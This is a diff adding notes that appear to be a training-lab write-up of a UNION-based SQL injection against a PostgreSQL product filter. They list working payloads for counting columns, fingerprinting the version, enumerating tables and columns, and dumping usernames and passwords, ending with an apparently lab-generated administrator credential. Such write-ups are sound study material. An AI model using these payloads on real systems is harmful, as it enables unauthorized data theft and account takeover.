@@ -1,0 +1,61 @@
+SQL Injection: Listing database contents on non-Oracle databases
+
+SQLi Location: Product category filter
+
+End Goals:
+
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns
+- Output the table contents
+- Login as the administrator user
+
+ANALYSIS
+-------------
+
+* We can first fuzz the application with a SQLi character like ' to validate existence of the vulnerability
+
+1. Find the number of columns that the vulnerable query is using
+
+' order by 1--  # Response code 200 => Column exists
+' order by 2--  # Response code 200 => Column exists
+' order by 3--  # Internal Server Error => Column doesn't exist
+
+Thus, the vulnerable query is making use of 2 columns
+
+2. Determine the data types of the columns
+
+' UNION select 'a', NULL--  # Column of type string/text
+' UNION select NULL, 'a'--  # Column of type string/text
+
+We can eventually use both columns since the accept type text/string
+
+3. Determine the database type and version - Use SQLi cheatsheet
+
+Since we are dealing with a non-Oracle database, we will only evaluate the followinh:
+
+Microsoft:      ' UNION select @@version, NULL--    # Not an MSSQL database
+PostgreSQL:     ' UNION select version(), NULL--    # Response code 200 => PostgreSQL 11.12 (Debian 11.12-1.pgdg90+1)
+MYSQL:          ' UNION select @@version, NULL--
+
+4. Output the list of table names in the database - Use the SQLi cheatsheet
+
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+-> users_ayngay
+
+*** Google for PostreSQL "information_schema" to identify the correct columns that you need to query for
+
+5. Output column names of the table identified above
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ayngay'--
+
+-> username_kszlft
+-> password_qeovrp
+
+*** Google for PostreSQL "information_schema.columns" to identify the correct columns that you need to query for
+
+6. Output the usernames and passwords from the identified table and columns above
+
+' UNION select username_kszlft, password_qeovrp from users_ayngay--
+
+-> administrator: 4r1zusluvobep72q09hc
